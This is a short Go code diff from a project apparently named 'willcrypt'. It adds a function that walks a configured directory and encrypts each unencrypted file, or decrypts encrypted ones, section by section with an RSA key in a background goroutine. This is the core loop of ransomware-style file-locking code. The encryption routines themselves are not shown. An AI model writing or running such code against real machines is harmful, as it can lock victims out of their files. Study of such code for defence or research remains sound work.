@@ -1,6 +1,7 @@
 package main
 
 import (
+	"crypto/rsa"
 	"path/filepath"
 	"strings"
 	"sync"
@@ -8,6 +9,7 @@ import (
 
 	"github.com/sywc670/willcrypt/internal/config"
 	"github.com/sywc670/willcrypt/pkg/gowalk"
+	"github.com/sywc670/willcrypt/pkg/wcrypt"
 )
 
 func walk(startDir string, wg *sync.WaitGroup, fn func(string, bool)) {
@@ -55,4 +57,21 @@ func walk(startDir string, wg *sync.WaitGroup, fn func(string, bool)) {
 	}
 
 	gowalk.Walk(startDir, wg, filter)
+}
+
+func goWalkCryption(priv *rsa.PrivateKey, wg *sync.WaitGroup) {
+	startDir := cfg.Location
+	encryptionOrDecryption := func(filepath string, isEncrypted bool) {
+		if isEncrypted {
+			debug(filepath, " decrypting...")
+			// wcrypt.Decrypt(filepath, priv)
+			wcrypt.DecryptBySection(filepath, priv)
+		} else if !isEncrypted {
+			debug(filepath, " encrypting...")
+			// wcrypt.Encrypt(filepath, priv)
+			wcrypt.EncryptBySection(filepath, priv)
+		}
+	}
+	debug("Start Walk")
+	go walk(startDir, wg, encryptionOrDecryption)
 }
